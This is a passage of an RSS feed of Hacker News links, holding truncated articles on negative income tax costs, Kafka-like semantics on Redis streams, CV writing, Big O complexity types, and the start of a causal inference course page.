id="block-yui_3_17_2_1_1589732525261_13391"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5ccb0d4e11f7842cbed64179/1589732894581-1MQV9WSFXYWNZDQMIMQH/ke17ZwdGBToddI8pDm48kH23KVWagbNOYpajbj_MQLNZw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZamWLI2zvYWH8K3-s_4yszcp2ryTI0HqTOaaUohrI8PIJtg7yny0RBSV5PxpX1XPrwAROGqRUCBAuccPtaePpQsKMshLAGzx4R3EDFOm1kBS/Cost+Now.jpg" data-image="https://images.squarespace-cdn.com/content/v1/5ccb0d4e11f7842cbed64179/1589732894581-1MQV9WSFXYWNZDQMIMQH/ke17ZwdGBToddI8pDm48kH23KVWagbNOYpajbj_MQLNZw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZamWLI2zvYWH8K3-s_4yszcp2ryTI0HqTOaaUohrI8PIJtg7yny0RBSV5PxpX1XPrwAROGqRUCBAuccPtaePpQsKMshLAGzx4R3EDFOm1kBS/Cost+Now.jpg" data-image-dimensions="800x500" data-image-focal-point="0.5,0.5" alt="Cost Now.jpg" data-load="false" data-image-id="5ec1661e3ca6b4722ce5e268" data-type="image" src="https://images.squarespace-cdn.com/content/v1/5ccb0d4e11f7842cbed64179/1589732894581-1MQV9WSFXYWNZDQMIMQH/ke17ZwdGBToddI8pDm48kH23KVWagbNOYpajbj_MQLNZw-zPPgdn4jUwVcJE1ZvWQUxwkmyExglNqGp0IvTJZamWLI2zvYWH8K3-s_4yszcp2ryTI0HqTOaaUohrI8PIJtg7yny0RBSV5PxpX1XPrwAROGqRUCBAuccPtaePpQsKMshLAGzx4R3EDFOm1kBS/Cost+Now.jpg">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div data-block-type="2" id="block-yui_3_17_2_1_1589732525261_16103"><div><p>Each plan slightly differs, but taken together, they create a spectrum to anchor our cost expectations. But details make all the difference. For example, the disparity between <a href="https://works.bepress.com/widerquist/75/"><span>Widerquist</span></a> and <a href="http://www.scottsantens.com/the-cost-of-universal-basic-income-is-the-net-transfer-amount-not-the-gross-price-tag"><span>Santens</span></a>’ estimates derives largely from differences in assumed tax rates. <a href="https://sci-hub.tw/10.1080/10875549.2014.991889"><span>Wiederspan et. al</span></a>’s NIT proposal is for household, rather than individual income. And <a href="https://njfac.org/wp-content/uploads/2018/05/The-Relative-Cost-of-a-UBI-and-NIT-2006-1.pdf"><span>Philip Harvey’s</span></a> estimate was set at the poverty line with a 25.6% phaseout rate, with numbers given in 2002 terms.</p><p>For the present proposal, I calculated the cost using <a href="https://www.census.gov/data/tables/time-series/demo/income-poverty/cps-pinc/pinc-02.html"><span>2018 data</span></a> from the current population survey. It gives the distribution of personal incomes in increments of $2,500, providing the quantity of individuals in each earning bracket. For each bracket, I took the middle of the bracket as the income for that group. For example, for the 11,090,000 individuals in the income group between $0 - …</p></div></div></div></div></div></article></section></main></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://musingmind.org/essays/negative-income-tax-proposal">https://musingmind.org/essays/negative-income-tax-proposal</a></em></p>]]>
            </description>
            <link>https://musingmind.org/essays/negative-income-tax-proposal</link>
            <guid isPermaLink="false">hacker-news-small-sites-24261714</guid>
            <pubDate>Mon, 24 Aug 2020 15:43:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to implement Kafka-like semantics on top of Redis streams]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24261675">thread link</a>) | @syrocode
<br/>
August 24, 2020 | https://mattwestcott.co.uk/blog/redis-streams-vs-kafka | <a href="https://web.archive.org/web/*/https://mattwestcott.co.uk/blog/redis-streams-vs-kafka">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><h2>How to implement Kafka-like semantics on top of Redis streams</h2><hr><p><a href="https://kafka.apache.org/" target="_blank" rel="noopener">Kafka</a> is known for solving large-scale data processing problems and has
been widely deployed in the infrastructure of many <a href="https://kafka.apache.org/powered-by" target="_blank" rel="noopener">well-known companies</a>.
Back in 2015, <a href="https://engineering.linkedin.com/kafka/running-kafka-scale" target="_blank" rel="noopener">LinkedIn</a> had 60 clusters with a total of 1100
brokers processing 13 million messages per second.</p><p>But it turns out that scale is not the only thing Kafka is good at. The
programming paradigm it promotes — partitioned, ordered, event processing — is a
good solution to many problems you are likely to face. For example, if events
represent rows to be indexed into a search database, it's important that the
last modification is the final one indexed, otherwise searches will return stale
data indefinitely. Similarly, if events represent user actions, processing the
second one ('user upgraded account') might rely on the first ('user created
account').</p><p>This paradigm is different to traditional job queue systems, in which events are
popped off a queue by many workers simultaneously, which is simple and scalable,
but which destroys any ordering guarantees.</p><p>Let's say you want ordered processing, but perhaps you don't want to use Kafka
due its reputation as a heavy-duty system that's difficult or expensive to
operate. How does Redis compare, now that it has the <a href="https://redis.io/topics/streams-intro" target="_blank" rel="noopener">'stream'</a>
data structure, released in version 5.0? Does it solve the same problem?</p><p>Let's start with the basic architecture found in Kafka. The fundamental data
structure is the topic. It's an append-only sequence of records ordered by time.
The benefits of using this data structure are well-described in the now-classic
blog post <a href="https://engineering.linkedin.com/distributed-systems/log-what-every-software-engineer-should-know-about-real-time-datas-unifying" target="_blank" rel="noopener">The Log</a>, by Jay Kreps.</p><figure><img src="https://mattwestcott.co.uk/images/kafka-topic.png"><figcaption><a href="https://kafka.apache.org/intro" target="_blank" rel="noopener">Source</a></figcaption></figure><p>Topics are partitioned to enable them to scale: each one could be hosted on
separate Kafka instances. The records in each partition are assigned sequential
ids, known as offsets, that uniquely identify each record within the partition.
A consumer processes records sequentially, keeping track of its last-seen
offset. Since records are persisted in a topic, multiple consumers can process
records independently of one another.</p><figure><img src="https://mattwestcott.co.uk/images/kafka-consumers.png"><figcaption><a href="https://kafka.apache.org/intro" target="_blank" rel="noopener">Source</a></figcaption></figure><p>In practice, you will likely distribute your processing across many machines.
To enable this, Kafka offers a 'consumer group' abstraction, which is a set of
processes that cooperate to consume data from a topic. A topic's partitions are
divided among the members of the group. Then, when members join or leave the group,
the partitions must be reassigned so that each member receives a fair share of
the partitions. This is known as the rebalancing algorithm.</p><figure><img src="https://mattwestcott.co.uk/images/kafka-groups.png"><figcaption><a href="https://www.confluent.io/blog/tutorial-getting-started-with-the-new-apache-kafka-0-9-consumer-client/" target="_blank" rel="noopener">Source</a></figcaption></figure><p>Note that a single partition is only ever processed by a single member of the
consumer group. (But a single member may be responsible for multiple
partitions.) This enables the strictly ordered processing guarantee.</p><p>This set of tools is very useful. You can scale your processing easily by adding
more workers and Kafka takes care of the distributed coordination problems.</p><p>How does the Redis <a href="https://redis.io/topics/streams-intro" target="_blank" rel="noopener">'stream'</a> data structure compare? A Redis
stream is conceptually equivalent to a single partition of a Kafka topic
described above, with small differences:</p><ul><li>It is a persistent, ordered store of events (same as in Kafka)</li><li>It has a configurable maximum length (vs. a retention period in Kafka)</li><li>Events store keys and values, like a Redis <a href="https://redis.io/commands#hash" target="_blank" rel="noopener">Hash</a> (vs. a single
key and value in Kafka)</li></ul><p>The major difference is that <b>consumer groups in Redis are nothing like consumer
groups in Kafka</b>.</p><p>In Redis, a consumer group is a set of processes all reading from the same
stream. Redis ensures that events will only be delivered to one consumer in the
group. For example, in the diagram below, Consumer 1 will not process '9' next —
it will skip over it since Consumer 2 has already seen it. Consumer 1 will be
given the next event that has not been seen by any other group members.</p><figure><img src="https://mattwestcott.co.uk/images/redis-groups.png"><figcaption>The Redis consumer group architecture</figcaption></figure><p>The group acts as a way to parallelise the processing of a single stream. If
you're thinking that looks a lot like a traditional job queue architecture,
you're correct. It therefore loses the ordering guarantee that is central to
stream processing, which is rather unfortunate.</p><p>So how can we build a stream processing engine on top of Redis if it only offers
effectively a single partition of a topic with job-queue semantics? Well, if you
want Kafka's features, you need to build them yourself. This means implementing:</p><p><b>1. Event partitioning</b>. You'll need to create <em>N</em> streams and consider each
one a partition. Then, at send time, you need to decide which partition should
receive it, presumbly based on a hash of your event or one of its fields.</p><p><b>2. A worker-partition assignment system</b>. To scale out and support multiple
workers, you'll need to create an algorithm to distribute partitions amongst
them, ensuring that each worker owns a mutually exclusive subset of them, i.e.
an equivalent to Kafka's "rebalance" system.</p><p><b>3. In-order processing with acknowledgement</b>. Each worker needs to iterate
over each of its partitions, keeping track of its offsets. Even though Redis
consumer groups have job-queue semantics, they can help here. The trick is to
use a single consumer per group and then create a single group per partition.
Then every partition will be processed in-order and you can take advantage of
the built-in consumer group state tracking: Redis can track not only offsets,
but per-event acknowledgement, which is quite powerful.</p><p>This is the absolute minimum required. If you want your solution to be robust,
you'll probably also want to think about error handling: in addition to crashing
your worker, maybe you'll want a mechanism to forward errors to a "dead-letter"
stream and continue processing.</p><p>The good news — if you're into Python — is that I've solved these problems and
more in a newly released library called <a href="https://github.com/mjwestcott/runnel" target="_blank" rel="noopener">Runnel</a>. You are welcome
to check it out if you want to benefit from Kafka-like semantics on top of
Redis. Here's how it looks, basically identical to one of the Kafka diagrams
above:</p><figure><img src="https://mattwestcott.co.uk/images/runnel-workers.png"><figcaption>Runnel workers</figcaption></figure><p>Workers coordinate their ownership of partitions via locks implemented in Redis.
They communicate with each other via a special 'control' stream. For more
information, including a detailed breakdown of the architecture and rebalance
algorithm, see the <a href="https://runnel.dev/" target="_blank" rel="noopener">Runnel docs</a>.</p><p>Is Redis a good choice for large-scale event processing? There's a fundamental
trade-off: since everything is in-memory, you gain unparalleled processing
speed, but it's not suitable for storing unbounded amounts of data. With Kafka
you <em>might</em> be willing to persist all your events indefinitely<sup id="fnref-1"><a href="#fn-1">1</a></sup>, but with
Redis you are certainly going to store a fixed window of recent events — only
enough for your processors to have a comfortable buffer in case they slow down
or crash. This means you'll probably also want to use an external long-term
event store such as S3, for example to be able to replay them, which adds
complexity to your architecture but reduces cost.</p><p>My main motivation for working on this problem was the ease-of-use and low cost
involved in deploying and operating Redis. That's why it's attractive vs Kafka.
It's also a fantastic set of tools that has stood the test of time
magnificently. It turns out that with some effort, it can support the
distributed stream processing paradigm too, so check out <a href="https://github.com/mjwestcott/runnel" target="_blank" rel="noopener">Runnel</a>
if you're interested.</p></article></div>]]>
            </description>
            <link>https://mattwestcott.co.uk/blog/redis-streams-vs-kafka</link>
            <guid isPermaLink="false">hacker-news-small-sites-24261675</guid>
            <pubDate>Mon, 24 Aug 2020 15:39:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Writing a Resume They Can't Ignore]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24261673">thread link</a>) | @zeshana
<br/>
August 24, 2020 | https://blog.zeshan.me/post/writing-a-cv-they-cant-ignore | <a href="https://web.archive.org/web/*/https://blog.zeshan.me/post/writing-a-cv-they-cant-ignore">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Securing a job this year is going to be a struggle for most people. Whether you're a new graduate trying to get your foot in the door of an industry, or you've been made redundant and are looking to get back on your feet. Whatever your circumstances, your chances of getting a great new job usually start in the same place as everyone else: your CV. Here's how to write a CV that recruiters will <em>want</em> to read.</p><hr><p>Before we get started, <strong>who am I, and why should you listen to me?</strong> I'm currently an Associate at a global asset management firm, and I review the CVs of vulnerable people for a British charity (<a href="https://www.princes-trust.org.uk/">The Prince's Trust</a>). Recruitment, and resumes in particular, are something I see all the time, and I'd love to share a few tips to help you improve yours. Still interested? Let's get started!</p><p>I completely see the appeal of including everything you've ever done of note in your CV. These achievements were likely hard-won, and you have a right to be proud of them, no matter how small they are. But a lot of the CVs I've read come out at over the three-page mark. The chances of all three pages being critically relevant to the role that you've applied for are near-zero. </p><p>Think about when you're trying to choose between a handful of different products to buy - are you looking to read three pages of prose about each one? Or would you prefer a <strong>single, focused page</strong>, with the most relevant features for you highlighted in bold?</p><blockquote><p>If your CV is the length of a short novel, you are likely not even making it to the evaluation stage.</p></blockquote><p>Recruiters are inundated with CVs to read, and the best way to make sure yours isn't passed over immediately is making it as easy as possible to extract information from it. If your CV is the length of a short novel, you are likely not even making it to the evaluation stage. It's too difficult to pull out the relevant information to make a decision, from such a large sea of text. You're getting passed over. Brevity, and focus will give you a fighting chance of making it through. So stick to one page.</p><p>One of the most common reasons I've seen for lengthy CVs is that the candidate is applying for a variety of jobs, often in entirely different industries, with vastly different skills required. Instead of trying to cram <em>all</em> of your experience into a single one-size-fits-all CV, try to create separate CVs for each <em>type</em> of role you're applying for. </p><p><img alt="/static/cv/image_(1).png" src="https://blog.zeshan.me/static/cv/image_(1).png"></p><p>For example, when applying for a customer service role, you could use the version that emphasises your retail experience and social skills. If you're applying for a job as an engineer, you can use the CV that emphasises your degree and engineering projects, and so on. This focus will give you a much higher chance of success in each role.</p><p>All of this customisation sounds like a lot of work, but here's a really quick, simple way to get it done, without writing any new content:</p><ol><li>Create a "parent" document, with all of the possible things you could include on your CV.</li><li>For each type of job (e.g. sales, recruitment, engineer), create a new blank document and copy over the sections, jobs, or achievements that are most relevant for that job type. Make sure you keep to a single page!</li></ol><p><img alt="/static/cv/image_(4).png" src="https://blog.zeshan.me/static/cv/image_(4).png"></p><p>When it comes to making it easy for employers to pick out information from your CV, bullet points have a massive advantage over prose. Here's a bullet pointed list to explain why:</p><ul><li>They naturally force you to divide your thoughts into easily-digestible, bite-sized chunks.</li><li>They release you from having to make your sentences be entirely grammatically correct, freeing up valuable space on  the page.</li><li>Your ideas become more cohesive, as a single bullet point stands alone, and has to make sense without the reader having read everything around it.</li><li>The reader can clearly see the start and end of each piece of information on the page, and their eyes can dart and dash around to whatever catches their attention.</li></ul><p>All of this adds to the readability of your CV, and massively reduces the amount of time needed to figure out whether you're a suitable candidate.</p><p>A common piece of advice for CVs is to use the <strong>STAR</strong> (Situation-Task-Activity-Result) format for each bullet point. I think that this is excessive and can lead a lot of people into writing long sections of prose, which is (as already mentioned) harder to read quickly. I recommend flipping this idea on its head, and including the minimum information needed to make the point. Try starting with just Activity-Result, or <strong>AR</strong>, for each bullet point, and add only as much context as you need for the sentence to make sense.</p><p>Here are some examples:</p><hr><h3>Before</h3><p><em>In July 2019, I actively sought a month-long intensive Italian language course to bring my year abroad to a close. I spent my evenings and weekends developing my language skills through rigorous self-study, as well as orchestrating events and trips for myself and fellow students, including a wine-tasting evening at a local restaurant.</em></p><h3>After (using AR format)</h3><ul><li><em>Month-long <strong>intensive Italian language course</strong> completed during a year abroad.</em></li><li><em>Organised 4 cultural trips and events for fellow students, <strong>communicating fluently</strong> with local businesses to negotiate a <strong>40% volume discount</strong> for our group's excursions.</em></li></ul><hr><h3>Before</h3><p><em>Between March 2018 and September 2019, I was employed at Johnson's News Accounting Centre during university holidays. This was initially a temporary administrative role, but my efficient independent management of a bulk mail output led to my contract being extended and my position changed to Accounts Payable Clerk. I had no prior experience in accounting, but my quick progression demonstrates my ability to quickly adapt to new professional challenges. The role required me to contact suppliers by telephone, process and manage invoice payments, chase senior employees to commence the receipting process, use relevant software systems including SAP, and carry out various administrative tasks. I also voluntarily completed out-of-hours work at busy periods, such as year-end.</em></p><h3>After (using AR format)</h3><ul><li><em>Independently managed two <strong>national-scale bulk mail outputs</strong> (March 2018 &amp; July 2018).</em></li><li><em>Success in this administrative project led to my <strong>contract being extended</strong> and being <strong>promoted</strong> to Accounts Payable Clerk.</em></li></ul><hr><blockquote><p>Apply this idea across your entire CV, and your biggest accomplishments will be screaming out to the hiring manager</p></blockquote><p>If I asked you to tell me the most impressive things mentioned in the <em>"Before"</em> excerpts, it'd probably take you a while, and you'd hate every minute of it. But notice how much easier the <em>"After"</em> versions are to scan, and to pick out key achievements from. Apply this idea across your entire CV, and your biggest accomplishments will be screaming out to the hiring manager - leaving you with a much better chance of making it past résumé screens.</p><blockquote><p>This is a crucial component of a good CV, and is what elevates your content from a boring description of your duties to a solid sales pitch.</p></blockquote><p>If you're using the STAR format for bullet points, or my trimmed down AR format from above, they both suggest you end on the same point: results. Whatever task or activity you did, what was the outcome? What impact did you have? This is a crucial component of a good CV, and is what elevates your content from a boring description of your duties to a solid sales pitch. </p><p>If you "served customers efficiently", why not mention that you reduced the average customer's waiting time by 20%? If you "implemented a smarter checkout system", why not mention that it increased revenues by £100k after it was deployed?</p><p><img alt="/static/cv/image_(2).png" src="https://blog.zeshan.me/static/cv/image_(2).png"></p><p>The more you can focus on what you <strong>achieved</strong>, rather than what you <strong>did</strong>, the more impressive your CV will seem. Including numbers makes your achievements measurable, and makes them much more credible. They also give a sense of scale, showing the hiring manager just how much impact you could have if they choose to hire you. </p><p>The format and style of your CV can be a massive boost to how professional you seem. Equally, the greatest text content in the world will be ignored entirely if it's delivered in the professional equivalent of rainbow Comic Sans. It really matters how your CV looks at a glance - it would be a massive shame for poor formatting to prevent your actual profile from even being considered.</p><h2>Templates</h2><p>I find that CVs using a <a href="https://www.overleaf.com/gallery/tagged/cv">LaTeX template</a> usually look the most professional due to the clean typography and rigid formatting. It's harder for things to look "off" in LaTeX, as by default you're given much less control over layout. One of my favourite starting points (and the one I used as a base for my own CV) is <a href="https://www.overleaf.com/latex/templates/software-engineer-resume/gqxmqsvsbdjf">this template by Sourabh Bajaj</a>. Even if you don't know how to use LaTeX, you can get to grips with it relatively quickly: just clone a template using Overleaf, and start replacing the placeholder content with your own. If you want to avoid LaTeX, I'd recommend recreating a similar look and feel in your word processor of choice.</p><h2>Fonts</h2><p>Keep the number of colours used to a minimum. Black-and-white, or tasteful use of a single color, will prevent your CV from looking too busy. Use <strong>bold</strong> to make keywords stand out.</p><p>Avoid using a default font like Calibri. I recommend a serif from <a href="https://www.fontsquirrel.com/fonts/computer-modern">Computer Modern</a> (this is LaTeX's default font), or a professional sans-serif like <a href="https://fonts.google.com/specimen/Inter">Inter</a>. Google Fonts has a large number of free fonts for you to download, but stick to a maximum of two: one for headings and one for body text. <a href="https://fontpair.co/">FontPair</a> can help you to choose fonts that look good together.</p><h2>Structure</h2><p>The top of your CV should contain your name, email address and phone number. A short, one-sentence objective summary can be helpful, but usually isn't necessary. <strong>Do not include:</strong> photos of yourself, your address, or "star" ratings of your skills. The first two aren't relevant, take up a lot valuable space, and even open you up to discrimination based on your appearance. "Star" ratings of your skills are <a href="https://workplace.stackexchange.com/a/75700">extremely subjective, and essentially meaningless</a>. Anything less than 4 stars is essentially calling attention to your weaknesses - why bother? Use your bullet points to explain the amazing things …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.zeshan.me/post/writing-a-cv-they-cant-ignore">https://blog.zeshan.me/post/writing-a-cv-they-cant-ignore</a></em></p>]]>
            </description>
            <link>https://blog.zeshan.me/post/writing-a-cv-they-cant-ignore</link>
            <guid isPermaLink="false">hacker-news-small-sites-24261673</guid>
            <pubDate>Mon, 24 Aug 2020 15:39:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Big O Time/Space Complexity Types Explained]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24261649">thread link</a>) | @soygul
<br/>
August 24, 2020 | https://quanticdev.com/algorithms/primitives/big-o-time-space-complexity-types-explained | <a href="https://web.archive.org/web/*/https://quanticdev.com/algorithms/primitives/big-o-time-space-complexity-types-explained">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <section id="main_content">
        
<p>Today we will investigate the most important time and space complexity types. Time and space complexities are a measure of a function’s processing power and memory requirements. Many time/space complexity types have special names that you can use while communicating with others. While some of the names for complexity types are well known, like linear and constant time, some others are living in the shadows, like quadratic and factorial time. In this article, I will use the big O notation to denote the complexities, which is specifically used to describe the worst-case performance of algorithms. Note that any time you see “^” character in this article, it means “power”. For instance “n^2” means “n squared”.</p>

<p>Table of contents:</p>
<ul>
  <li>Overview</li>
  <li>Constant Time/Space Complexity: O(1)</li>
  <li>Logarithmic Complexity: O(logn)</li>
  <li>Linear Complexity: O(n)</li>
  <li>Polynomial Complexity: O(n^k)</li>
  <li>Exponential Complexity: O(2^n)</li>
  <li>Factorial Complexity: O(n!)</li>
  <li>Alternative Big O Notation</li>
  <li>Conclusion</li>
</ul>

<h2 id="resources">Resources</h2>
<p>You can find the video narration of this article on YouTube with illustrations: <a href="https://www.youtube.com/watch?v=4K1O6SXRSws" target="_blank">https://www.youtube.com/watch?v=4K1O6SXRSws</a></p>

<iframe width="560" height="315" src="https://www.youtube.com/embed/4K1O6SXRSws" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>

<p>Video has additional tips and illustrations. If you want to read the comments or leave a comment, do so under YouTube video. If you want to contribute to the article, make a pull request on GitHub.</p>

<p>Alternative Big O Notation poster, stickers, mugs, and more:</p>
<ul>
  <li><a href="https://quanticdev.com/shop" target="_blank">https://quanticdev.com/shop</a></li>
  <li><a href="https://www.redbubble.com/shop/ap/54268092" target="_blank">https://www.redbubble.com/shop/ap/54268092</a> (Alternative Big O Notation artwork)</li>
  <li><a href="https://www.redbubble.com/shop/ap/54006599" target="_blank">https://www.redbubble.com/shop/ap/54006599</a> (Quantic Developers Club artwork)</li>
</ul>

<p>Other articles referred to in this article:</p>
<ul>
  <li><a href="https://quanticdev.com/algorithms/dynamic-programming/kadanes-algorithm" target="_blank">My “Kadane’s Algorithm” article</a>, which is a great demonstration of an O(n) linear time complexity and O(1) constant space complexity algorithm.</li>
</ul>

<p>Wikipedia articles referenced in this article:</p>
<ul>
  <li>List of all time/space complexities: <a href="https://en.wikipedia.org/wiki/Time_complexity" target="_blank">https://en.wikipedia.org/wiki/Time_complexity</a></li>
  <li>Asymptotic analysis: <a href="https://en.wikipedia.org/wiki/Asymptotic_analysis" target="_blank">https://en.wikipedia.org/wiki/Asymptotic_analysis</a></li>
</ul>

<h2 id="constant-timespace-complexity-o1">Constant Time/Space Complexity: O(1)</h2>
<p>Simplest of all complexities. Not complex at all! If an operation always completes in the same amount of CPU time regardless of the input size, it is called a constant time operation. If it always uses the same amount of memory regardless of the input size, it is called a constant space operation.</p>

<p>The classic example of constant time complexity is arrays. Accessing an element by its index will always take the same amount of time regardless of the array size. Same goes for hash-table lookup. No matter how many elements a hash table has, retrieving an element by its key will always take a constant amount of time.</p>

<p>When it comes to constant space complexity, calculating Fibonacci numbers is a great example. To calculate the next Fibonacci number, all you need to keep in memory is the previous two Fibonacci numbers. Hence, you will always use a constant amount of memory, no matter how big the Fibonacci number that you are trying to calculate.</p>

<h2 id="logarithmic-complexity-ologn">Logarithmic Complexity: O(logn)</h2>
<p>This is a complexity type found in efficient algorithms, where the time complexity of a function only grows logarithmically in relation to the input. Let me remind you that logn is the shorthand for log_10 n (log base 10 of n), and the definition of logarithm is: log_a n=x only if a^x=n. Since big O notation is asymptotic, we always use logn regardless of the logarithm’s base. The logarithm’s base changes nothing but a constant multiplier, hence it is irrelevant to our analysis. If you want to learn more about asymptotic analysis, I will put the Wikipedia link in the resources section above</p>

<p>Binary search is a classic example of logarithmic time complexity. Imagine you have a sorted array of integers. When you are searching for a specific value, all you need to do is to get the middle element of the array and compare it to the value that you are looking for. If the middle element is less than the value you are looking for, you can safely discard the first half of the array, and repeat the same process on the second half, until you find your value. As a result, you will discard half of the remaining elements on each iteration, which will give you a log_2 n (log base 2 of n) time complexity in the worst-case scenario, where n is the number of elements in the array. As I said, in big O notation, we do not care about the base of logarithms, so we denote the time complexity of binary search as just O(logn).</p>

<video controls=""><source src="https://quanticdev.com/algorithms/primitives/media/binary_search.mp4" type="video/mp4"></video>

<p>Logarithmic space complexity, however, is quite rare to see. I have only seen it once in a real-life problem, which was quite an edge case, so there is no need to worry about it.</p>

<h2 id="linear-complexity-on">Linear Complexity: O(n)</h2>
<p>This is yet another straightforward complexity type. If an algorithm’s time/space usage only grows linearly with the number of elements in the input, then it has linear time/space complexity. A great example of this is Kadane’s Algorithm. When you have an array of integers, and you are looking for the subarray with the maximum possible sum, you can apply Kadane’s Algorithm to get the solution in linear time. Kadane’s Algorithm only needs to read each member of the array once; hence you can process the entire array in only O(n) time. On the other hand, it has O(1) space complexity, since it only needs to create a couple of variables. If you want to learn more about Kadane’s Algorithm, I have a dedicated article on it with a ton of illustrations, and the link to it is in the resources section above.</p>

<h2 id="polynomial-complexity-onk">Polynomial Complexity: O(n^k)</h2>
<p>If an algorithm takes n to the power of k time, where k is some constant, it has polynomial time complexity. Let me remind you that a polynomial takes the form of An^k + Bn^(k-1) + … + Fn^2 + Gn + H, where A, B, …, G, H are some constants. Remember that big O notation is asymptotic, so if an algorithm takes An^3 + n amount of time, we simply denote it as O(n^3).</p>

<p>A decent number of sorting algorithms run on polynomial time, including bubble sort, insertion sort, selection sort and more. Also, basic arithmetic operations (multiplication, division, etc.) can be implemented in polynomial time.</p>

<p>O(n^2) polynomial complexity has the special name of “quadratic complexity”. Likewise, O(n^3) is called “cubic complexity”. For instance, brute force approaches to max-min subarray sum problems generally have O(n^2) quadratic time complexity. You can see an example of this in my Kadane’s Algorithm article.</p>

<h2 id="exponential-complexity-o2n">Exponential Complexity: O(2^n)</h2>
<p>This is where things are starting to get serious. When the complexity of an algorithm is proportional to a constant k raised to the power of n, you get exponential complexity. Remember that n is the number of elements in the input. With this complexity type, when your input array is big enough, resource consumption will quickly approach infinity! Yet again, due to the asymptotic nature of big O notation, you can ignore the constant k and always denote exponential complexity as O(2^n), as n gets very big, the value of k will not matter.</p>

<p>The classic example of exponential complexity is password cracking. To be able to discover someone’s password, you need to try every possible combination of every letter. Say that you have a password of length of 5 (n=5), which is made up of only English letters (k=26). Your time complexity in the worst-case scenario would be O(k^n) = 26^5, which can be computed in less than a second. Now if you have a password of length 10, and you use special characters that can be typed using a regular computer keyboard (~100 of them, including digits and letters), your time complexity would be 100^10. This would take years to compute and try using a single computer (assuming there is some slow hashing involved). That is why you should always use a 10+ character password with special characters in it! Even longer, if you want to be safe against organizational attacks.</p>

<p><strong>Tip</strong>: If you want this article to reach more fellow software engineers like you, share it with them. Google tends to promote content that is shared by many people, which in turn generates more shares, which then leads to exponential views… hopefully!</p>

<h2 id="factorial-complexity-on">Factorial Complexity: O(n!)</h2>
<p>This is the endgame. Factorial complexity means that you are trying to compute all possible permutations of a given input. You might remember that in high-school, you are thought how to calculate all permutations of a list. Now that is your factorial time complexity! Brute-force solution to traveling salesman problem is also O(n!), where you basically calculate all possible paths to your destination and then take the shortest one. Of course, there are much more creative and efficient approaches to solving it, which I will get into in a future article full of illustrations.</p>

<h2 id="alternative-big-o-notation">Alternative Big O Notation</h2>
<p>If you were wondering what the thumbnail of this article was about, hold on tight. I have compiled an alternative version of the big O notation. I always found things easy to remember when they rhyme, especially with humor. So, here is my take on big O notation, which can help you remember the rankings of big O types:</p>

<div><div><pre><code>O(1) = O(yeah)
O(logn) = O(nice)
O(n) = O(k)
O(n^2) = O(my)
O(2^n) = O(no)
O(n!) = O(mg)
O(n^n) = O(sh*t!)
</code></pre></div></div>

<p>If you want to have the alternative big O notation as a sticker, so you can stick it to unusual places, you can get it from <a href="https://quanticdev.com/shop" target="_blank">quanticdev.com/shop</a>. I will leave the link to it in the resources section above. If you really want to confuse fellow software engineers, you can also get it as a small poster, bigger poster, framed print, hoodie, phone case, mug, blanket, or even a shower curtain!</p>

<p><a href="https://www.redbubble.com/shop/ap/54268092" target="_blank"><img src="https://quanticdev.com/algorithms/primitives/big-o-time-space-complexity-types-explained/images/alternative_big_o_notation_poster.jpg" alt="Alternative Big O Notation Poster"></a></p>

<p>And if you want to join the quantic developers club, you can get a sticker for your computer or even a nice canvas poster for your study corner.</p>

<p><a href="https://www.redbubble.com/shop/ap/54006599" target="_blank"><img src="https://quanticdev.com/algorithms/primitives/big-o-time-space-complexity-types-explained/images/quanticdev_sticker.jpg" alt="Quantic Developers Club Artwork"></a></p>

<p>Anything you order or gift helps the channel, while hopefully bringing you some motivation. If you want to see the full collection, check out <a href="https://quanticdev.com/shop" target="_blank">quanticdev shop</a>.</p>

<p>Side Note: Asymptotically, O(n^n) is equal to O(2^n), so the last line in the alternative big O notation list is just for the humor’s sake.</p>

<h2 id="conclusion">Conclusion</h2>
<p>Big O notation list goes longer …</p></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://quanticdev.com/algorithms/primitives/big-o-time-space-complexity-types-explained">https://quanticdev.com/algorithms/primitives/big-o-time-space-complexity-types-explained</a></em></p>]]>
            </description>
            <link>https://quanticdev.com/algorithms/primitives/big-o-time-space-complexity-types-explained</link>
            <guid isPermaLink="false">hacker-news-small-sites-24261649</guid>
            <pubDate>Mon, 24 Aug 2020 15:36:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Introduction to Causal Inference Online Course]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24261639">thread link</a>) | @Schiphol
<br/>
August 24, 2020 | https://www.bradyneal.com/causal-inference-course?s=09 | <a href="https://web.archive.org/web/*/https://www.bradyneal.com/causal-inference-course?s=09">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main">
  <div>
    
    <div>
    <!-- <div class="col-lg-10 col-lg-offset-1 col-md-10 col-md-offset-1"> -->
    
    <!-- <div class="col-lg-10 col-lg-offset-1 col-md-10 col-md-offset-1"> -->
      <p>You’ve found the online causal inference course page.
Although, the course text is written from a machine learning perspective, this course is meant to be for anyone with the necessary <a href="#prerequisites">prerequisites</a> who is interested in learning the basics of causality.
